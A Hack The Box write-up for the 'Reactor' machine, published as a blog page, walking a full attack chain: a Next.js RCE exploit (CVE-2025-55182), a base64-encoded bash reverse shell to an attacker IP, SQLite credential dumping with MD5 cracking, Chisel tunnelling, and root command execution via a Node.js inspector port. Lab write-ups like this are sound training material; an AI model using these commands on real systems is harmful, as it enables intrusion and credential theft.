@@ -1,0 +1,188 @@
+<!DOCTYPE html><html lang="en" data-theme="cybersec"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.16.19"><title>Hack The Box | Reactor</title><meta name="description" content="Reactor is an easy Linux machine featuring Next.js 15.0.3 vulnerable to CVE-2025-55182 (React2Shell), leading to unauthenticated RCE. Lateral movement via SQLite credential dumping and MD5 cracking leads to a Node.js Inspector debug port for root privilege escalation."><meta name="og:title" content="Hack The Box | Reactor"><meta name="og:description" content="Reactor is an easy Linux machine featuring Next.js 15.0.3 vulnerable to CVE-2025-55182 (React2Shell), leading to unauthenticated RCE. Lateral movement via SQLite credential dumping and MD5 cracking leads to a Node.js Inspector debug port for root privilege escalation."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Hack The Box | Reactor"><meta name="twitter:description" content="Reactor is an easy Linux machine featuring Next.js 15.0.3 vulnerable to CVE-2025-55182 (React2Shell), leading to unauthenticated RCE. Lateral movement via SQLite credential dumping and MD5 cracking leads to a Node.js Inspector debug port for root privilege escalation."><link rel="stylesheet" href="/_astro/_slug_.DD1NdWwY.css">
+<link rel="stylesheet" href="/_astro/_slug_.C164DcFl.css"><script type="module" src="/_astro/hoisted.CoBk3TA5.js"></script></head> <body> <div class="bg-base-100 drawer lg:drawer-open min-h-screen"> <input id="my-drawer" type="checkbox" class="drawer-toggle"> <div class="drawer-content bg-base-100 flex flex-col min-h-screen"> <header class="navbar bg-cyber-gray/80 backdrop-blur-sm border-b border-white/5 px-4 lg:hidden"> <div class="flex-1"> <label for="my-drawer" class="btn btn-ghost text-gray-400"> <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 15h16"></path> </svg> </label> </div> </header> <div class="md:flex md:justify-center flex-1"> <main class="p-6 pt-10 lg:max-w-[900px] max-w-[100vw] w-full">  <article> <div class="mb-8"> <div class="flex items-center gap-3 mb-4"> <span class="badge badge-easy">Linux - Easy</span> <time class="text-gray-400 text-sm">Jun 8, 2026</time>  </div> <h1 class="text-3xl md:text-4xl font-extrabold text-white mb-2">Hack The Box | Reactor</h1> <div class="flex flex-wrap gap-2 mt-4"> <span class="badge badge-easy text-xs">CVE-2025-55182</span><span class="badge badge-easy text-xs">React2Shell</span><span class="badge badge-easy text-xs">NextJS</span><span class="badge badge-easy text-xs">Linux</span><span class="badge badge-easy text-xs">Reverse Shell</span><span class="badge badge-easy text-xs">SQLite</span><span class="badge badge-easy text-xs">Hashcat</span><span class="badge badge-easy text-xs">Chisel</span><span class="badge badge-easy text-xs">PrivEsc</span><span class="badge badge-easy text-xs">HTB</span> </div> </div> <div class="mb-8 rounded-xl overflow-hidden border border-white/10"> <img src="/reactor.png" alt="Hack The Box | Reactor" class="w-full object-cover"> </div> <div class="prose prose-invert prose-p:text-gray-400 prose-li:text-gray-400 prose-headings:text-white prose-a:text-neon-green prose-code:text-neon-green prose-pre:bg-cyber-gray prose-pre:border prose-pre:border-white/10 prose-strong:text-neon-green max-w-none">  <ul>
+<li>
+<ol>
+<li>Nmap TCP Open Ports:</li>
+</ol>
+</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sh"><code><span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> nmap</span><span style="color:#79B8FF"> -sS</span><span style="color:#79B8FF"> -p-</span><span style="color:#79B8FF"> --open</span><span style="color:#79B8FF"> -n</span><span style="color:#79B8FF"> -Pn</span><span style="color:#79B8FF"> --min-rate</span><span style="color:#79B8FF"> 5000</span><span style="color:#79B8FF"> 10.129.12.175</span><span style="color:#79B8FF"> -oG</span><span style="color:#9ECBFF"> allports</span></span>
+<span class="line"></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Port</th><th>Service</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td></tr><tr><td>3000/tcp</td><td>HTTP</td></tr></tbody></table>
+<ul>
+<li>1.2 Nmap basic scripts and service scan:</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sh"><code><span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -sCV</span><span style="color:#79B8FF"> -p22,3000</span><span style="color:#79B8FF"> -oN</span><span style="color:#9ECBFF"> target</span><span style="color:#79B8FF"> 10.129.12.175</span></span>
+<span class="line"></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#79B8FF">PORT</span><span style="color:#79B8FF">     STATE</span><span style="color:#79B8FF"> SERVICE</span><span style="color:#79B8FF"> VERSION</span></span>
+<span class="line"><span style="color:#79B8FF">22</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">tcp   </span><span style="color:#79B8FF">open</span><span style="color:#E1E4E8">  ssh     OpenSSH </span><span style="color:#79B8FF">9.</span><span style="color:#FDAEB7;font-style:italic">6p1</span><span style="color:#E1E4E8"> (Ubuntu Linux; protocol </span><span style="color:#79B8FF">2.0</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#79B8FF">3000</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">tcp </span><span style="color:#79B8FF">open</span><span style="color:#E1E4E8">  http    Node.js (Next.js)</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#E1E4E8">_http</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">title: ReactorWatch </span><span style="color:#F97583">|</span><span style="color:#E1E4E8"> Core Monitoring System</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#E1E4E8"> http</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">server</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">header: x</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">powered</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">by: Next.js</span></span>
+<span class="line"><span style="color:#E1E4E8">Service Info: </span><span style="color:#79B8FF">OS</span><span style="color:#E1E4E8">: Linux; </span><span style="color:#79B8FF">CPE</span><span style="color:#E1E4E8">: cpe:</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">o:linux:linux_kernel</span></span>
+<span class="line"></span></code></pre>
+<ul>
+<li>
+<ol start="2">
+<li>Web Fingerprinting:</li>
+</ol>
+</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sh"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -sI</span><span style="color:#9ECBFF"> http://10.129.12.175:3000</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> grep</span><span style="color:#79B8FF"> -iE</span><span style="color:#9ECBFF"> 'x-powered-by|next|x-nextjs'</span></span>
+<span class="line"><span style="color:#6A737D"># X-Powered-By: Next.js</span></span>
+<span class="line"><span style="color:#6A737D"># x-nextjs-cache: HIT</span></span>
+<span class="line"><span style="color:#6A737D"># x-nextjs-prerender: 1</span></span>
+<span class="line"></span></code></pre>
+<p>Browsing to the dashboard: <strong>ReactorWatch | Core Monitoring System</strong> — a nuclear reactor monitoring panel with employee names (Elena Rodriguez, Marcus Kim, James Thompson). No login visible, SPA static. No hidden routes found via gobuster.</p>
+<p>The application itself has no bugs, so we pivot to the framework — Next.js 15.0.3.</p>
+<hr>
+<ul>
+<li>
+<ol start="3">
+<li>Exploitation — CVE-2025-55182 (React2Shell):</li>
+</ol>
+</li>
+</ul>
+<p>Next.js 15.0.3 is vulnerable to <strong>CVE-2025-55182</strong> — unauthenticated RCE via the <code>Next-Action</code> header. The React Flight Protocol fails to validate references between chunks, enabling prototype pollution that escalates to arbitrary code execution via <code>Function()</code>.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sh"><code><span class="line"><span style="color:#6A737D"># PoC — test command execution</span></span>
+<span class="line"><span style="color:#B392F0">python3</span><span style="color:#9ECBFF"> CVE-2025-55182.py</span><span style="color:#9ECBFF"> http://10.129.12.175:3000</span><span style="color:#9ECBFF"> id</span></span>
+<span class="line"><span style="color:#6A737D"># uid=999(node) gid=988(node)</span></span>
+<span class="line"></span></code></pre>
+<ul>
+<li>3.2 Reverse Shell:</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sh"><code><span class="line"><span style="color:#6A737D"># Encode the payload</span></span>
+<span class="line"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> 'bash -i >&#x26; /dev/tcp/10.10.14.200/4444 0>&#x26;1'</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> base64</span><span style="color:#79B8FF"> -w</span><span style="color:#79B8FF"> 0</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Listener</span></span>
+<span class="line"><span style="color:#B392F0">nc</span><span style="color:#79B8FF"> -lvnp</span><span style="color:#79B8FF"> 4444</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Execute via exploit</span></span>
+<span class="line"><span style="color:#B392F0">python3</span><span style="color:#9ECBFF"> CVE-2025-55182.py</span><span style="color:#9ECBFF"> http://10.129.12.175:3000</span><span style="color:#9ECBFF"> "echo BASE64_HERE | base64 -d | bash"</span></span>
+<span class="line"></span></code></pre>
+<p>Shell obtained as <code>node</code>.</p>
+<hr>
+<ul>
+<li>
+<ol start="4">
+<li>Lateral Movement — SQLite + Hash Cracking:</li>
+</ol>
+</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sh"><code><span class="line"><span style="color:#B392F0">ls</span><span style="color:#79B8FF"> -la</span><span style="color:#9ECBFF"> /opt/reactor-app/</span></span>
+<span class="line"><span style="color:#6A737D"># reactor.db  ← SQLite database</span></span>
+<span class="line"><span style="color:#6A737D"># .env        ← API keys, configuration</span></span>
+<span class="line"></span></code></pre>
+<ul>
+<li>4.2 Dump the database:</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="color:#E1E4E8">sqlite3 </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">opt</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">reactor</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">app</span><span style="color:#F97583">/</span><span style="color:#79B8FF">reactor</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">db</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">.tables</span></span>
+<span class="line"><span style="color:#F97583">SELECT</span><span style="color:#F97583"> *</span><span style="color:#F97583"> FROM</span><span style="color:#E1E4E8"> users;</span></span>
+<span class="line"></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb</span></span>
+<span class="line"><span>2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>Two MD5 hashes (32 hex characters).</p>
+<ul>
+<li>4.3 Crack the hash:</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sh"><code><span class="line"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> "39d97110eafe2a9a68639812cd271e8e"</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF"> hash.txt</span></span>
+<span class="line"><span style="color:#B392F0">hashcat</span><span style="color:#79B8FF"> -m</span><span style="color:#79B8FF"> 0</span><span style="color:#79B8FF"> -a</span><span style="color:#79B8FF"> 0</span><span style="color:#9ECBFF"> hash.txt</span><span style="color:#9ECBFF"> /usr/share/wordlists/rockyou.txt</span><span style="color:#79B8FF"> --force</span></span>
+<span class="line"><span style="color:#6A737D"># 39d97110eafe2a9a68639812cd271e8e:reactor1</span></span>
+<span class="line"></span></code></pre>
+<ul>
+<li>4.4 Switch to engineer:</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sh"><code><span class="line"><span style="color:#B392F0">su</span><span style="color:#9ECBFF"> engineer</span></span>
+<span class="line"><span style="color:#6A737D"># Password: reactor1</span></span>
+<span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /home/engineer/user.txt</span></span>
+<span class="line"><span style="color:#6A737D"># HTB{...}</span></span>
+<span class="line"></span></code></pre>
+<hr>
+<ul>
+<li>
+<ol start="5">
+<li>Privilege Escalation — Node.js Inspector:</li>
+</ol>
+</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sh"><code><span class="line"><span style="color:#B392F0">ss</span><span style="color:#79B8FF"> -tulnp</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> grep</span><span style="color:#79B8FF"> 9229</span></span>
+<span class="line"><span style="color:#6A737D"># tcp  LISTEN  127.0.0.1:9229  ← Node.js V8 Inspector</span></span>
+<span class="line"></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sh"><code><span class="line"><span style="color:#B392F0">ps</span><span style="color:#9ECBFF"> aux</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> grep</span><span style="color:#9ECBFF"> inspect</span></span>
+<span class="line"><span style="color:#6A737D"># root  /usr/bin/node --inspect /opt/uptime-monitor/worker.js</span></span>
+<span class="line"></span></code></pre>
+<p>The uptime monitor worker runs as <strong>root</strong> with <code>--inspect</code> enabled.</p>
+<ul>
+<li>5.2 Tunnel with Chisel:</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sh"><code><span class="line"><span style="color:#6A737D"># Attacker</span></span>
+<span class="line"><span style="color:#B392F0">chisel</span><span style="color:#9ECBFF"> server</span><span style="color:#79B8FF"> -p</span><span style="color:#79B8FF"> 8000</span><span style="color:#79B8FF"> --reverse</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Victim</span></span>
+<span class="line"><span style="color:#B392F0">./chisel</span><span style="color:#9ECBFF"> client</span><span style="color:#9ECBFF"> 10.10.14.200:8000</span><span style="color:#9ECBFF"> R:9229:127.0.0.1:9229</span></span>
+<span class="line"></span></code></pre>
+<p>Now <code>localhost:9229</code> on attacker → <code>127.0.0.1:9229</code> on victim.</p>
+<ul>
+<li>5.3 Connect to debugger and execute as root:</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sh"><code><span class="line"><span style="color:#B392F0">node</span><span style="color:#9ECBFF"> inspect</span><span style="color:#9ECBFF"> 127.0.0.1:9229</span></span>
+<span class="line"></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#E1E4E8">debug</span><span style="color:#F97583">></span><span style="color:#B392F0"> exec</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"process.mainModule.require('child_process').execSync('id').toString()"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6A737D">// uid=0(root) gid=0(root)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">debug</span><span style="color:#F97583">></span><span style="color:#B392F0"> exec</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6A737D">// HTB{...}</span></span>
+<span class="line"></span></code></pre>
+<hr>
+<h2 id="attack-chain-summary">Attack Chain Summary</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Phase</th><th>Technique</th><th>Tool</th></tr></thead><tbody><tr><td>Recon</td><td>Port scan + fingerprinting</td><td>nmap, curl</td></tr><tr><td>Exploit</td><td>React2Shell RCE (CVE-2025-55182)</td><td>Python PoC, netcat</td></tr><tr><td>Lateral</td><td>SQLite dump + MD5 crack</td><td>sqlite3, hashcat</td></tr><tr><td>PrivEsc</td><td>Node Inspector debug port + Chisel</td><td>chisel, node inspect</td></tr></tbody></table>  </div> </article>  </main> </div> <footer class="bg-cyber-gray border-t border-white/5 py-6"> <div class="md:flex md:justify-center"> <div class="p-6 lg:max-w-[900px] max-w-[100vw]"> <div class="flex flex-col md:flex-row justify-between items-center gap-4"> <div class="text-gray-500 text-sm font-mono"> <span class="text-neon-green">&gt;</span> &copy; 2026 b4dScript | <span data-i18n="footer.rights">All rights reserved</span> </div> <div class="flex gap-4"> <a href="https://github.com/b4dScript" target="_blank" class="text-gray-500 hover:text-white transition-colors" aria-label="GitHub"> <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"> <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"></path> </svg> </a> <a href="https://app.hackthebox.com/profile/b4dScript" target="_blank" class="text-gray-500 hover:text-neon-green transition-colors" aria-label="HackTheBox"> <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"> <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path> </svg> </a> <a href="mailto:your-email@example.com" class="text-gray-500 hover:text-white transition-colors" aria-label="Email"> <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path> </svg> </a> </div> </div> </div> </div> </footer> </div> <div class="drawer-side z-40"> <label for="my-drawer" class="drawer-overlay"></label> <aside class="px-4 pt-6 h-auto min-h-full w-[19rem] bg-cyber-gray border-r border-white/5 text-base-content flex flex-col"> <div class="w-fit mx-auto mb-8"> <a href="/"> <div class="avatar transition-transform hover:scale-105 block m-auto"> <div class="w-[9rem] rounded-full avatar-ring"> <img src="/newavatar.jpg" class="mask mask-circle" alt="Profile image" width="300" height="300" loading="lazy" decoding="async"> </div> </div> </a> </div> <nav class="flex-1"> <ul class="space-y-1"> <li> <a href="/" class="flex items-center gap-3 py-2.5 px-4 rounded-lg text-sm font-medium transition-all duration-200 text-gray-400 hover:text-white hover:bg-white/5"> <span><svg class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg></span> <span data-i18n="sidebar.home">Home</span> </a> </li><li> <a href="/writeups" class="flex items-center gap-3 py-2.5 px-4 rounded-lg text-sm font-medium transition-all duration-200 text-neon-green bg-white/10"> <span><svg class="w-4 h-4 text-neon-green" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg></span> <span data-i18n="sidebar.writeups">Blog | WriteUps</span> </a> </li><li> <a href="/cv" class="flex items-center gap-3 py-2.5 px-4 rounded-lg text-sm font-medium transition-all duration-200 text-gray-400 hover:text-white hover:bg-white/5"> <span><svg class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg></span> <span data-i18n="sidebar.cv">CV</span> </a> </li><li> <a href="/contact" class="flex items-center gap-3 py-2.5 px-4 rounded-lg text-sm font-medium transition-all duration-200 text-gray-400 hover:text-white hover:bg-white/5"> <span><svg class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg></span> <span data-i18n="sidebar.contact">Contact</span> </a> </li> </ul> </nav> <div class="mt-auto pb-6 px-4 space-y-4"> <div class="flex justify-center"> <button id="lang-switch" class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium text-gray-400 hover:text-neon-green bg-white/5 hover:bg-white/10 rounded-lg transition-all duration-200" aria-label="Toggle language"> <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5h12M9 3v2m1.048 9.5A18.022 18.022 0 016.412 9m6.088 9h7M11 21l5-10 5 10M12.751 5C11.783 10.77 8.07 15.61 3 18.129"></path> </svg> <span id="lang-label">EN</span> </button>  </div> <div class="flex justify-center gap-4"> <a href="https://github.com/b4dScript" target="_blank" class="text-gray-500 hover:text-white transition-colors" aria-label="GitHub"> <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"> <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"></path> </svg> </a> <a href="#" class="text-gray-500 hover:text-neon-green transition-colors" aria-label="LinkedIn"> <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"> <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path> </svg> </a> </div> </div> </aside> </div> </div> </body></html>
